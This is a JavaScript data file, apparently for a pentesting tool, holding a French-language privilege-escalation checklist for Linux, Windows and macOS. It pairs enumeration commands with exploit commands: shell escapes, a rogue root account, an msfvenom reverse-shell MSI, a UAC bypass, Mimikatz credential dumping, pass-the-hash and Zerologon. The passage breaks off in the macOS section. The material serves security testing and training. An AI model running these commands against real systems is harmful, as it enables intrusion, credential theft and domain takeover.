// ==========================================================================
// ==================== CHECKLIST DEFINITION (TAGS REFACTORED) ==============
// ==========================================================================
const CHECKLIST_DEFINITION = {
    'Linux': {
        'Kernel Exploits': [
            {
                id: 'l_kernel_version',
                label: 'Kernel Version & Vulnerabilities',
                description: 'Vérifier la version du kernel et rechercher des exploits de privilèges locaux connus.',
                checkCommand: 'uname -a\ncat /proc/version\nsearchsploit "Linux Kernel $(uname -r | cut -d\'-\' -f1)" local privilege escalation',
                exploitCommand: '# (Requires specific exploit based on searchsploit results)\n# Exemple: gcc exploit.c -o exploit && ./exploit',
                tips: 'Les exploits de kernel sont puissants mais risqués. Testez-les avec précaution. Vérifiez la compatibilité exacte de l\'exploit avec la version du kernel et l\'architecture.',
                links: ['https://www.exploit-db.com/'],
                tags: ['Exploit', 'Kernel']
            }
        ],
        'Permissions & Misconfigurations': [
            {
                id: 'l_sudo_l',
                label: 'Sudo Permissions (sudo -l)',
                description: 'Vérifier les commandes que l\'utilisateur peut exécuter avec sudo, en particulier celles sans mot de passe ou permettant l\'exécution en tant que root.',
                checkCommand: 'sudo -l',
                exploitCommand: '# Si /bin/bash est autorisé:\nsudo /bin/bash\n# Si un éditeur est autorisé (ex: vim):\nsudo vim /etc/shadow (puis :!/bin/bash)\n# Si find est autorisé:\nsudo find . -exec /bin/bash \\; -quit',
                tips: 'GTFOBins est une ressource essentielle pour trouver comment abuser des binaires autorisés par sudo.',
                links: ['https://gtfobins.github.io/#+sudo'],
                tags: ['Permissions', 'Misconfiguration', 'Sudo']
            },
            {
                id: 'l_suid_sgid',
                label: 'SUID/SGID Binaries',
                description: 'Rechercher les binaires avec les bits SUID ou SGID activés qui pourraient être exploités pour exécuter du code avec les privilèges du propriétaire (souvent root).',
                checkCommand: 'find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null',
                exploitCommand: '# Si /usr/bin/find est SUID:\nfind . -exec /bin/bash -p \\; -quit\n# Si /usr/bin/cp est SUID:\ncp /etc/shadow /tmp/shadow_copy && chmod 600 /tmp/shadow_copy\n# Si /usr/bin/base64 est SUID:\nLFILE=/etc/shadow; base64 "$LFILE" | base64 --decode',
                tips: 'Concentrez-vous sur les binaires non standards ou ceux connus pour être exploitables (voir GTFOBins).',
                links: ['https://gtfobins.github.io/#+suid', 'https://gtfobins.github.io/#+sgid'],
                tags: ['Permissions', 'Binary', 'SUID/SGID']
            },
            {
                id: 'l_capabilities',
                label: 'Linux Capabilities',
                description: 'Identifier les binaires avec des capabilities étendues qui pourraient permettre une escalade de privilèges.',
                checkCommand: 'getcap -r / 2>/dev/null',
                exploitCommand: '# Si python a cap_setuid+ep:\n./python -c \'import os; os.setuid(0); os.system("/bin/bash -p")\'\n# Si tar a cap_dac_read_search+ep:\ntar -cf shadow.tar /etc/shadow',
                tips: 'Les capabilities comme `cap_setuid`, `cap_sys_admin`, `cap_dac_read_search` sont particulièrement intéressantes.',
                links: ['https://gtfobins.github.io/#+capabilities', 'https://linux-audit.com/linux-capabilities-hardening-linux-binaries/'],
                tags: ['Permissions', 'Binary', 'Capabilities']
            },
            {
                id: 'l_writable_files',
                label: 'World-Writable Files/Directories',
                description: 'Rechercher les fichiers et répertoires importants (scripts, configurations) qui sont modifiables par tous les utilisateurs.',
                checkCommand: 'find / -type f -perm -0002 -ls 2>/dev/null\nfind / -type d -perm -0002 -ls 2>/dev/null',
                exploitCommand: '# Si /etc/passwd est world-writable:\necho \'root2:$1$xyz$abcdefghijklmnopq.:0:0:root:/root:/bin/bash\' >> /etc/passwd\n# Si un script exécuté par root est world-writable:\necho \'chmod +s /bin/bash\' >> /path/to/script.sh',
                tips: 'Faites attention aux fichiers de configuration, aux scripts dans `/etc/cron.*`, `/etc/init.d`, etc.',
                tags: ['Permissions', 'Misconfiguration', 'Filesystem']
            },
             {
                id: 'l_path_hijacking',
                label: 'PATH Environment Variable Hijacking',
                description: 'Vérifier si le PATH contient des répertoires modifiables (comme `.`) avant les répertoires système, permettant d\'exécuter un binaire malveillant à la place d\'un binaire légitime.',
                checkCommand: 'echo $PATH\n# Vérifier les permissions des dossiers dans $PATH',
                exploitCommand: '# Si /tmp est dans le PATH avant /usr/bin et qu\'un script root exécute `ls`:\ncd /tmp\necho \'#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > ls\nchmod +x ls\n# Attendre que le script root exécute `ls`',
                tips: 'Particulièrement pertinent si un script exécuté par root utilise des chemins relatifs pour les commandes.',
                tags: ['Permissions', 'Misconfiguration', 'Environment']
            },
            {
                id: 'l_acl',
                label: 'Abusing File System Permissions (ACLs)',
                description: 'Vérifier les Access Control Lists (ACLs) des fichiers et répertoires pour des permissions inattendues.',
                checkCommand: 'find / -type f -acl -exec getfacl {} \\; 2>/dev/null\nfind / -type d -acl -exec getfacl {} \\; 2>/dev/null',
                exploitCommand: '# Si getfacl montre u:<user>:rwx sur un fichier privilégié:\nsetfacl -m u:$USER:rwx /chemin/fichier_privilegie; echo \'evil_command\' > /chemin/fichier_privilegie',
                tips: 'Les ACLs peuvent outrepasser les permissions Unix standard. Recherchez les entrées `user:<your_user>:rwx` ou `group:<your_group>:rwx`.',
                tags: ['Permissions', 'Filesystem', 'ACL']
            },
            {
                id: 'l_pam',
                label: 'Exploiting PAM (Pluggable Authentication Modules)',
                description: 'Vérifier les configurations PAM pour des faiblesses potentielles (rare mais possible).',
                checkCommand: 'ls -l /etc/pam.d/\ncat /etc/pam.d/*',
                exploitCommand: '# Très contextuel, dépend d\'une mauvaise configuration spécifique.',
                tips: 'Recherchez des modules mal configurés ou des fichiers modifiables dans `/etc/pam.d/`.',
                tags: ['Misconfiguration', 'Authentication', 'PAM']
            }
        ],
        'Services & Scheduled Tasks': [
            {
                id: 'l_cron_jobs',
                label: 'Cron Jobs Analysis',
                description: 'Analyser les tâches cron système et utilisateur pour identifier des scripts ou binaires modifiables exécutés avec des privilèges élevés.',
                checkCommand: 'ls -l /etc/cron*\ncat /etc/crontab\ncat /etc/cron.d/*\ncrontab -l',
                exploitCommand: '# Si un script dans /etc/cron.hourly est modifiable:\necho \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' >> /etc/cron.hourly/modifiable_script.sh',
                tips: 'Vérifiez les permissions des scripts et des répertoires où ils se trouvent. Attention aux wildcards dans les commandes cron.',
                tags: ['Misconfiguration', 'Persistence', 'Cron']
            },
            {
                id: 'l_systemctl_abuse',
                label: 'Abusing Systemctl (via Sudo)',
                description: 'Si l\'utilisateur a des droits sudo spécifiques sur `systemctl`, cela peut être utilisé pour démarrer/modifier des services et escalader.',
                checkCommand: 'sudo -l | grep systemctl',
                exploitCommand: '# Créer un service malveillant (evil.service):\n[Unit]\nDescription=Evil Service\n\n[Service]\nType=simple\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"\n\n[Install]\nWantedBy=multi-user.target\n\n# Placer le service et démarrer:\nsudo cp evil.service /etc/systemd/system/\nsudo systemctl enable evil.service --now',
                tips: 'Vérifiez si `sudo systemctl start/stop/enable/disable/edit` est autorisé.',
                tags: ['Permissions', 'Misconfiguration', 'Service', 'Sudo']
            },
             {
                id: 'l_writable_services',
                label: 'Writable Service Binaries/Configurations',
                description: 'Identifier les services systemd ou init.d dont les binaires ou les fichiers de configuration sont modifiables par l\'utilisateur actuel.',
                checkCommand: '# Pour systemd:\nsystemctl list-unit-files --type=service | grep enabled\n# Pour chaque service enabled, vérifier les permissions du binaire pointé par ExecStart dans le fichier .service\nfind /etc/systemd/system /usr/lib/systemd/system -name "*.service" -exec ls -l {} \\;\n# Pour init.d:\nfind /etc/init.d/ -type f -perm -o+w\nls -l /etc/init.d/*',
                exploitCommand: '# Si /usr/sbin/custom_service est modifiable:\necho \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > /usr/sbin/custom_service\n# Redémarrer le service (si possible via sudo ou automatiquement)',
                tips: 'Rechercher les services qui tournent en tant que root et dont les fichiers sont modifiables.',
                tags: ['Permissions', 'Misconfiguration', 'Service', 'Persistence']
            }
        ],
        'Credentials & Sensitive Info': [
            {
                id: 'l_history_files',
                label: 'Shell History Files',
                description: 'Vérifier les fichiers d\'historique du shell pour des mots de passe, clés API ou informations sensibles.',
                checkCommand: 'cat ~/.bash_history\ncat ~/.zsh_history\ncat ~/.ash_history\ncat /root/.bash_history (si lisible)',
                tips: 'Recherchez des commandes contenant `-p`, `password`, `pass`, `secret`, `key`, `token`, `ssh`, `mysql`, `psql`, etc.',
                tags: ['Credentials', 'Enumeration', 'History']
            },
            {
                id: 'l_config_files',
                label: 'Configuration Files',
                description: 'Rechercher des mots de passe en clair ou des informations sensibles dans les fichiers de configuration courants.',
                checkCommand: 'grep -iR "password\|passwd\|secret\|key\|token" /etc /var/www /home 2>/dev/null\nfind / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" -o -name "*.yaml" -exec grep -iHn "password\|passwd\|secret\|key\|token" {} \\; 2>/dev/null',
                tips: 'Faites attention aux fichiers de configuration des serveurs web, bases de données, applications personnalisées.',
                tags: ['Credentials', 'Enumeration', 'Filesystem']
            },
            {
                id: 'l_ssh_keys',
                label: 'SSH Keys',
                description: 'Rechercher des clés SSH privées (souvent dans `~/.ssh/id_rsa` ou d\'autres noms) qui pourraient être utilisées pour se connecter à d\'autres machines ou même à l\'utilisateur root sur la machine actuelle.',
                checkCommand: 'ls -al ~/.ssh/\nfind / -name "id_rsa*" -o -name "id_dsa*" -o -name "*.pem" 2>/dev/null',
                exploitCommand: '# Si une clé privée est trouvée et non protégée par mot de passe:\nssh -i /path/to/private_key user@target_host\n# Si protégée, essayer de cracker le mot de passe avec John the Ripper:\nssh2john /path/to/private_key > key.hash\njohn key.hash --wordlist=/usr/share/wordlists/rockyou.txt',
                tips: 'Vérifiez les permissions des clés. Les clés privées ne devraient être lisibles que par l\'utilisateur propriétaire.',
                tags: ['Credentials', 'SSH', 'Lateral Movement']
            },
            {
                id: 'l_environment_vars',
                label: 'Environment Variables',
                description: 'Vérifier les variables d\'environnement pour des informations sensibles.',
                checkCommand: 'env\nprintenv\ncat /proc/self/environ',
                tips: 'Recherchez des variables comme `DB_PASSWORD`, `API_KEY`, etc.',
                tags: ['Credentials', 'Enumeration', 'Environment']
            },
            {
                id: 'l_proc_cmdline',
                label: '/proc/*/cmdline',
                description: 'Vérifier les lignes de commande des processus en cours pour des arguments contenant des mots de passe ou des clés.',
                checkCommand: 'ps aux | grep -v "grep" | grep -i "password\|pass\|secret\|key"\ncat /proc/*/cmdline | tr \'\\0\' \'\\n\' | grep -i "password\|pass\|secret\|key"',
                tips: 'Certains services peuvent être lancés avec des mots de passe en argument.',
                tags: ['Credentials', 'Enumeration', 'Process']
            },
            {
                id: 'l_memory_dump',
                label: 'Memory Dump Analysis (Advanced)',
                description: 'Effectuer un dump de la mémoire et l\'analyser avec des outils comme Volatility ou GDB pour extraire des informations sensibles (mots de passe, clés, etc.).',
                checkCommand: '# Nécessite des outils spécifiques (ex: LiME pour dump, Volatility pour analyse)',
                exploitCommand: '# Exemple avec Volatility:\nvolatility -f memdump.raw --profile=LinuxMyProfile linux_pslist\nvolatility -f memdump.raw --profile=LinuxMyProfile linux_bash',
                tips: 'Technique avancée et potentiellement longue. Utile si d\'autres méthodes échouent.',
                links: ['https://github.com/volatilityfoundation/volatility', 'https://github.com/504ensicsLabs/LiME'],
                tags: ['Credentials', 'Advanced', 'Memory']
            }
        ],
        'Network & Lateral Movement': [
            {
                id: 'l_network_info',
                label: 'Network Information & Connections',
                description: 'Collecter des informations sur la configuration réseau, les connexions actives et les services en écoute pour identifier des points de pivot potentiels.',
                checkCommand: 'ip a\nss -tulnp\nnetstat -tulnp\ncat /etc/resolv.conf\narp -a',
                tips: 'Recherchez les services internes écoutant sur localhost ou d\'autres interfaces, ainsi que les connexions sortantes vers d\'autres machines.',
                tags: ['Enumeration', 'Network', 'Lateral Movement']
            },
            {
                id: 'l_nfs_shares',
                label: 'NFS Shares Misconfiguration',
                description: 'Vérifier les partages NFS montés ou exportés, en particulier ceux avec l\'option `no_root_squash`.',
                checkCommand: 'cat /etc/exports\nshowmount -e localhost\nmount | grep nfs',
                exploitCommand: '# Si un partage est monté avec no_root_squash depuis un serveur contrôlé:\nmount -t nfs <server_ip>:/path/to/share /mnt/nfs\ncp /bin/bash /mnt/nfs/bash_suid\nchmod +s /mnt/nfs/bash_suid\n# Sur la machine cible:\ncd /path/to/mounted/share\n./bash_suid -p',
                tips: 'L\'option `no_root_squash` permet à l\'utilisateur root sur le client d\'agir comme root sur le serveur NFS pour ce partage. Très dangereux.',
                links: ['https://book.hacktricks.xyz/linux-unix/nfs-no_root_squash-misconfiguration'],
                tags: ['Permissions', 'Misconfiguration', 'Network', 'NFS', 'Lateral Movement']
            }
        ],
        // ... Ajouter d'autres catégories et items Linux si nécessaire
    },
    'Windows': {
        'Permissions & Misconfigurations': [
            {
                id: 'w_always_install_elevated',
                label: 'AlwaysInstallElevated Policy',
                description: 'Vérifier si les clés de registre `AlwaysInstallElevated` sont activées, permettant à n\'importe quel utilisateur d\'installer des packages MSI avec les privilèges SYSTEM.',
                checkCommand: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
                exploitCommand: '# Générer un payload MSI avec msfvenom:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f msi -o evil.msi\n# Transférer evil.msi sur la cible\n# Exécuter l\'installeur:\nmsiexec /quiet /qn /i C:\\path\\to\\evil.msi',
                tips: 'Les deux clés (HKLM et HKCU) doivent être à 1 pour que ce soit exploitable.',
                tags: ['Permissions', 'Misconfiguration', 'Registry', 'Exploit']
            },
            {
                id: 'w_unquoted_service_paths',
                label: 'Unquoted Service Paths',
                description: 'Identifier les services Windows dont le chemin vers l\'exécutable contient des espaces et n\'est pas entouré de guillemets, permettant potentiellement d\'injecter un exécutable malveillant.',
                checkCommand: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v \'"\'',
                exploitCommand: '# Si le chemin est C:\\Program Files\\Some Dir\\service.exe et que C:\\Program Files\\ est modifiable:\n# Créer C:\\Program Files\\Some.exe (payload)\n# Redémarrer le service (ou attendre un redémarrage système)',
                tips: 'Nécessite des permissions d\'écriture sur un des dossiers du chemin avant l\'espace. Exemple: si le chemin est `C:\\Program Files\\Sub Dir\\service.exe`, il faut pouvoir écrire `C:\\Program.exe` ou `C:\\Program Files\\Sub.exe`.',
                tags: ['Permissions', 'Misconfiguration', 'Service', 'Filesystem']
            },
            {
                id: 'w_writable_service_perms',
                label: 'Insecure Service Permissions',
                description: 'Vérifier si l\'utilisateur actuel a des permissions pour modifier la configuration d\'un service existant (ex: changer le `binPath` pour pointer vers un exécutable malveillant).',
                checkCommand: '# Utiliser PowerUp.ps1 ou accesschk.exe\n# PowerUp:\nImport-Module .\\PowerUp.ps1; Get-ModifiableService\n# accesschk:\naccesschk.exe -uwcqv <User_Account> *',
                exploitCommand: '# Si le service "VulnSvc" est modifiable:\nsc config VulnSvc binpath= "C:\\path\\to\\payload.exe"\nsc stop VulnSvc\nsc start VulnSvc',
                tips: 'Les permissions intéressantes sont `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`, ou être propriétaire du service.',
                links: ['https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1', 'https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk'],
                tags: ['Permissions', 'Misconfiguration', 'Service']
            },
            {
                id: 'w_writable_service_binaries',
                label: 'Writable Service Binaries',
                description: 'Identifier les services dont le fichier exécutable est directement modifiable par l\'utilisateur actuel.',
                checkCommand: '# Utiliser PowerUp.ps1 ou accesschk.exe\n# PowerUp:\nImport-Module .\\PowerUp.ps1; Get-ModifiableServiceFile\n# accesschk:\n# Lister les services et vérifier les permissions sur chaque binaire pointé par binPath',
                exploitCommand: '# Remplacer le binaire original par un payload (garder une copie de l\'original!)\ncopy C:\\path\\to\\original.exe C:\\path\\to\\original.exe.bak\ncopy C:\\path\\to\\payload.exe C:\\path\\to\\original.exe\n# Redémarrer le service',
                tips: 'Moins courant que les permissions de service, mais très direct si trouvé.',
                tags: ['Permissions', 'Misconfiguration', 'Service', 'Filesystem']
            },
            {
                id: 'w_dll_hijacking',
                label: 'DLL Hijacking',
                description: 'Identifier les applications (souvent celles qui s\'exécutent avec des privilèges élevés) qui tentent de charger des DLL depuis des chemins non standards ou modifiables par l\'utilisateur.',
                checkCommand: '# Utiliser ProcMon (Process Monitor) de Sysinternals\n# Filtrer sur "NAME NOT FOUND" pour les opérations CreateFile/LoadImage\n# Chercher les tentatives de chargement de DLL dans des dossiers où l\'on peut écrire',
                exploitCommand: '# Placer une DLL malveillante (avec le même nom que celle recherchée) dans le dossier modifiable.\n# Redémarrer l\'application vulnérable.',
                tips: 'Nécessite une analyse minutieuse avec ProcMon. Vérifiez l\'ordre de recherche des DLL par Windows.',
                links: ['https://docs.microsoft.com/en-us/sysinternals/downloads/procmon'],
                tags: ['Permissions', 'Misconfiguration', 'DLL', 'Exploit']
            },
            {
                id: 'w_uac_bypass',
                label: 'User Account Control (UAC) Bypass',
                description: 'Rechercher et utiliser des techniques connues pour contourner l\'UAC et exécuter des commandes avec des privilèges élevés sans invite.',
                checkCommand: '# Vérifier le niveau UAC:\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin\n# Rechercher des techniques connues (ex: via UACME)',
                exploitCommand: '# Utiliser un outil comme UACME ou une technique spécifique (ex: fodhelper.exe, eventvwr.exe hijack)\n# Exemple avec fodhelper:\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /d "" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "C:\\path\\to\\payload.exe" /f\nfodhelper.exe',
                tips: 'Les techniques de bypass UAC changent régulièrement avec les mises à jour Windows. Vérifiez la compatibilité avec la version de Windows cible.',
                links: ['https://github.com/hfiref0x/UACME'],
                tags: ['Permissions', 'Exploit', 'UAC', 'Windows']
            },
            {
                id: 'w_gpo_perms',
                label: 'Insecure Group Policy Preferences (GPP)',
                description: 'Rechercher des mots de passe stockés dans les Group Policy Preferences (souvent dans des fichiers XML dans SYSVOL).',
                checkCommand: '# Rechercher les fichiers Groups.xml, Services.xml, ScheduledTasks.xml dans \\\\<Domain>\\SYSVOL\\<Domain>\\Policies\\\n# Utiliser PowerUp ou des scripts manuels pour décrypter les mots de passe cPassword',
                exploitCommand: '# Si un mot de passe est trouvé (ex: pour un compte admin local):\n# Utiliser le mot de passe pour se connecter ou exécuter des commandes (ex: via psexec)',
                tips: 'Cette vulnérabilité est ancienne (corrigée par MS14-025), mais peut encore exister sur des domaines non mis à jour. Les mots de passe sont chiffrés avec une clé AES publique.',
                tags: ['Credentials', 'Misconfiguration', 'Active Directory', 'GPO']
            },
            {
                id: 'w_adcs_abuse',
                label: 'Active Directory Certificate Services (ADCS) Abuse',
                description: 'Identifier des configurations vulnérables d\'ADCS (ESC1-ESC8) qui permettent l\'escalade de privilèges dans le domaine.',
                checkCommand: '# Utiliser Certify.exe ou Certipy.py\nCertify.exe find /vulnerable\nCertipy find -vulnerable -u <user>@<domain> -p <password> -dc-ip <dc_ip>',
                exploitCommand: '# Dépend de la vulnérabilité trouvée (ex: ESC1)\n# Certipy:\ncertipy req -u <user>@<domain> -p <password> -ca <ca_name> -template <template_name> -dc-ip <dc_ip>\ncertipy auth -pfx <cert.pfx> -dc-ip <dc_ip>',
                tips: 'Nécessite une compréhension des mécanismes d\'ADCS. Les outils automatisent la détection et l\'exploitation.',
                links: ['https://github.com/GhostPack/Certify', 'https://github.com/ly4k/Certipy'],
                tags: ['Permissions', 'Misconfiguration', 'Active Directory', 'ADCS', 'Exploit']
            }
        ],
        'Credentials & Secrets Dumping': [
            {
                id: 'w_sam_lsa_dump',
                label: 'SAM/LSA Secrets Dump',
                description: 'Tenter de dumper les hashes de mots de passe locaux (SAM) et les secrets LSA (mots de passe de service, etc.) depuis la mémoire ou le registre.',
                checkCommand: '# Nécessite des privilèges élevés (Admin ou SeDebugPrivilege)\n# Méthodes: Mimikatz, secretsdump.py, dump du registre (reg save)',
                exploitCommand: '# Mimikatz (en mémoire):\nprivilege::debug\nlsadump::sam\nlsadump::secrets\n# secretsdump.py (à distance ou local):\nsecretsdump.py -sam SAM.hive -system SYSTEM.hive LOCAL\n# Dump du registre:\nreg save HKLM\\SAM C:\\Temp\\SAM.hive\nreg save HKLM\\SYSTEM C:\\Temp\\SYSTEM.hive\n# (Transférer et analyser hors ligne avec secretsdump)',
                tips: 'Souvent détecté par les antivirus/EDR. L\'accès direct à la mémoire (Mimikatz) est plus furtif que le dump de fichiers.',
                links: ['https://github.com/gentilkiwi/mimikatz', 'https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py'],
                tags: ['Credentials', 'Dumping', 'SAM', 'LSA', 'Mimikatz']
            },
            {
                id: 'w_credman_vault',
                label: 'Windows Credential Manager & Vault',
                description: 'Vérifier les informations d\'identification stockées par l\'utilisateur dans le Gestionnaire d\'identification Windows et le coffre-fort Windows.',
                checkCommand: '# PowerShell:\ncmdkey /list\nGet-VaultCredential\n# Mimikatz:\nvault::cred\nvault::list',
                exploitCommand: '# Les mots de passe sont souvent récupérables en clair avec les privilèges de l\'utilisateur ou SYSTEM.',
                tips: 'Peut contenir des mots de passe pour des partages réseau, RDP, sites web, etc.',
                tags: ['Credentials', 'Enumeration', 'Vault']
            },
            {
                id: 'w_dpapi',
                label: 'DPAPI Secrets',
                description: 'Rechercher et décrypter les secrets protégés par DPAPI (Data Protection API) pour l\'utilisateur actuel.',
                checkCommand: '# Utiliser Mimikatz ou SharpDPAPI\n# Mimikatz:\ndpapi::masterkey /in:"%APPDATA%\\Microsoft\\Protect\\<User SID>\\<MasterKey GUID>"\ndpapi::cred /in:"%LOCALAPPDATA%\\Microsoft\\Credentials\\<Credential GUID>"\n# SharpDPAPI:\nSharpDPAPI.exe triage',
                exploitCommand: '# Nécessite le mot de passe de l\'utilisateur ou l\'accès à ses clés maîtres DPAPI.',
                tips: 'DPAPI protège de nombreuses informations sensibles (mots de passe de navigateur, clés wifi, etc.).',
                links: ['https://github.com/GhostPack/SharpDPAPI'],
                tags: ['Credentials', 'Dumping', 'DPAPI']
            },
            {
                id: 'w_browser_creds',
                label: 'Browser Credentials',
                description: 'Extraire les mots de passe et cookies stockés dans les navigateurs web installés.',
                checkCommand: '# Utiliser des outils spécifiques (LaZagne, Mimikatz, SharpChrome, etc.) ou manuellement (ex: via SQLite pour Firefox/Chrome)',
                exploitCommand: '# LaZagne:\nlaZagne.exe all\n# Mimikatz (Chrome - nécessite décryptage DPAPI):\ndpapi::chrome /in:"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"',
                tips: 'Les navigateurs modernes chiffrent les mots de passe, souvent avec DPAPI.',
                links: ['https://github.com/AlessandroZ/LaZagne'],
                tags: ['Credentials', 'Dumping', 'Browser']
            },
            {
                id: 'w_unattend_files',
                label: 'Unattend Files',
                description: 'Rechercher des fichiers d\'installation sans surveillance (Unattend.xml, sysprep.inf, etc.) qui peuvent contenir des mots de passe administrateur en clair ou encodés en Base64.',
                checkCommand: 'findstr /si password C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\System32\\Sysprep\\unattend.xml C:\\unattend.xml C:\\Windows\\System32\\sysprep.inf',
                tips: 'Ces fichiers sont souvent laissés après l\'installation initiale de Windows.',
                tags: ['Credentials', 'Misconfiguration', 'Filesystem']
            }
        ],
        'Active Directory & Lateral Movement': [
            {
                id: 'w_kerberoasting',
                label: 'Kerberoasting',
                description: 'Demander des tickets de service Kerberos pour des comptes de service (SPN) et tenter de cracker les hashes obtenus hors ligne pour récupérer les mots de passe des comptes de service.',
                checkCommand: '# Utiliser GetUserSPNs.py (Impacket), Rubeus, ou PowerView\n# GetUserSPNs:\nGetUserSPNs.py <domain>/<user> -dc-ip <dc_ip> -request\n# Rubeus:\nRubeus.exe kerberoast /outfile:hashes.txt',
                exploitCommand: '# Cracker les hashes avec Hashcat ou John the Ripper\nhashcat -m 13100 hashes.txt rockyou.txt',
                tips: 'Ne nécessite pas de privilèges élevés, juste un compte de domaine valide. Efficace contre les mots de passe faibles des comptes de service.',
                links: ['https://github.com/SecureAuthCorp/impacket', 'https://github.com/GhostPack/Rubeus'],
                tags: ['Credentials', 'Active Directory', 'Kerberos', 'Lateral Movement']
            },
            {
                id: 'w_asreproasting',
                label: 'AS-REP Roasting',
                description: 'Identifier les comptes utilisateurs du domaine pour lesquels la pré-authentification Kerberos est désactivée ("DONT_REQ_PREAUTH") et demander leur TGT pour cracker leur mot de passe hors ligne.',
                checkCommand: '# Utiliser GetNPUsers.py (Impacket) ou Rubeus\n# GetNPUsers:\nGetNPUsers.py <domain>/ -usersfile users.txt -format hashcat -outputfile hashes.txt\n# Rubeus:\nRubeus.exe asreproast /format:hashcat /outfile:hashes.txt',
                exploitCommand: '# Cracker les hashes avec Hashcat ou John the Ripper\nhashcat -m 18200 hashes.txt rockyou.txt',
                tips: 'Ne nécessite pas de compte de domaine valide au départ, juste la possibilité de communiquer avec le DC.',
                tags: ['Credentials', 'Active Directory', 'Kerberos', 'Lateral Movement']
            },
            {
                id: 'w_pass_the_hash',
                label: 'Pass the Hash (PtH)',
                description: 'Utiliser le hash NTLM d\'un utilisateur (souvent obtenu via dump SAM/LSA) pour s\'authentifier sur d\'autres machines sans connaître le mot de passe en clair.',
                checkCommand: '# Obtenir le hash NTLM (voir SAM/LSA Dump)',
                exploitCommand: '# Utiliser Mimikatz, psexec.py, smbexec.py, wmiexec.py\n# Mimikatz:\nprivilege::debug\nsekurlsa::pth /user:<username> /domain:<domain> /ntlm:<ntlm_hash> /run:cmd.exe\n# psexec.py:\npsexec.py <domain>/<username>@<target_ip> -hashes :<ntlm_hash>',
                tips: 'Très efficace pour le mouvement latéral si le même compte (ex: admin local) a le même mot de passe/hash sur plusieurs machines.',
                tags: ['Lateral Movement', 'Active Directory', 'Credentials', 'NTLM', 'Mimikatz']
            },
            {
                id: 'w_pass_the_ticket',
                label: 'Pass the Ticket (PtT)',
                description: 'Injecter un ticket Kerberos (TGT ou TGS) volé (ex: via Mimikatz) dans la session actuelle pour accéder aux ressources comme si l\'on était le propriétaire du ticket.',
                checkCommand: '# Obtenir un ticket Kerberos (ex: via Mimikatz `sekurlsa::tickets /export`)',
                exploitCommand: '# Utiliser Mimikatz ou Rubeus\n# Mimikatz:\nkerberos::ptt C:\\path\\to\\ticket.kirbi\n# Rubeus:\nRubeus.exe ptt /ticket:<base64_ticket_ou_chemin_fichier>',
                tips: 'Permet d\'usurper l\'identité d\'autres utilisateurs sans connaître leur mot de passe ou hash, juste en ayant accès à leurs tickets.',
                tags: ['Lateral Movement', 'Active Directory', 'Credentials', 'Kerberos', 'Mimikatz']
            },
            {
                id: 'w_zerologon',
                label: 'Zerologon (CVE-2020-1472)',
                description: 'Exploiter la vulnérabilité Zerologon pour réinitialiser le mot de passe du compte machine d\'un contrôleur de domaine (DC) et potentiellement obtenir des privilèges de Domain Admin.',
                checkCommand: '# Utiliser un script de scan pour vérifier si le DC est vulnérable (ex: zerologon_tester.py)',
                exploitCommand: '# Utiliser un exploit Zerologon (ex: cve-2020-1472-exploit.py)\npython cve-2020-1472-exploit.py <DC_NetBIOS_Name> <DC_IP>\n# Utiliser secretsdump.py avec le hash vide pour dumper les secrets du DC:\nsecretsdump.py <domain>/<DC_NetBIOS_Name>\$@<DC_IP> -no-pass\n# Restaurer le mot de passe original du DC après coup!',
                tips: 'Vulnérabilité critique mais patchée. Nécessite une restauration du mot de passe machine après exploitation pour éviter de casser le domaine.',
                tags: ['Exploit', 'Active Directory', 'Lateral Movement', 'Domain Admin']
            },
            {
                id: 'w_bloodhound',
                label: 'BloodHound Analysis',
                description: 'Utiliser BloodHound pour collecter des informations sur les relations de confiance, les appartenances aux groupes, les sessions et les ACLs dans Active Directory afin d\'identifier des chemins d\'attaque pour l\'escalade de privilèges ou le mouvement latéral.',
                checkCommand: '# Exécuter le collecteur BloodHound (SharpHound.exe ou SharpHound.ps1)\nSharpHound.exe --collectionmethod All\n# Importer les fichiers JSON générés dans l\'interface BloodHound',
                exploitCommand: '# Analyser les données dans BloodHound pour trouver des chemins d\'attaque (ex: shortest path to Domain Admins).',
                tips: 'Outil puissant pour visualiser les relations complexes dans AD et planifier des attaques.',
                links: ['https://github.com/BloodHoundAD/BloodHound', 'https://github.com/BloodHoundAD/SharpHound'],
                tags: ['Enumeration', 'Active Directory', 'Lateral Movement', 'Visualization']
            }
        ]
        // ... Ajouter d'autres catégories et items Windows si nécessaire
    },
    'MacOS': {
        // ... Définitions spécifiques à macOS à ajouter ici ...
        'Permissions & Misconfigurations': [
             {
                id: 'm_sudo_l',
                label: 'Sudo Permissions (sudo -l)',
                description: 'Vérifier les commandes que l\'utilisateur peut exécuter avec sudo.',
                checkCommand: 'sudo -l',
                exploitCommand: '# Similaire à Linux, dépend des binaires autorisés (voir GTFOBins)',
                tags: ['Permissions', 'Misconfiguration', 'Sudo']
            },
            {
                id: 'm_suid_sgid',
                label: 'SUID/SGID Binaries',
                description: 'Rechercher les binaires SUID/SGID.',
                checkCommand: 'find / -perm -4000 -o -perm -2000 -type f -exec ls -ld {} \\; 2>/dev/null',
